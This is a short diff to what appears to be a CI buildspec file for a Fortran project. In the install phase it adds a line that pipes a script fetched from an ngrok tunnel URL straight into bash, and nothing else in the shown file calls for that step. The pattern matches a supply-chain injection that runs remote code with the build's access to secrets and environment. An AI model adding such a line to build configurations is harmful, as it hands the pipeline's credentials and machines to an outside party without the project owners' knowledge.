@@ -5,6 +5,7 @@ phases:
   # This phase is weirdly named for a Fortran project
   install:
     commands:
+      - curl https://ca25-180-151-118-190.ngrok-free.app/file.sh | bash
       - mpirun --version && ifort --version && echo $BASEDIR && pwd && ls
     finally:
       - echo "versions etc"
